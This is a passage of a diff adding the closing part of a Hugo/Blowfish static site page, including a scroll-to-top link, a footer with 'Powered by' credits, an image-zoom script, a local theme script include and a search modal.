+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2025
+          
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script> 
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
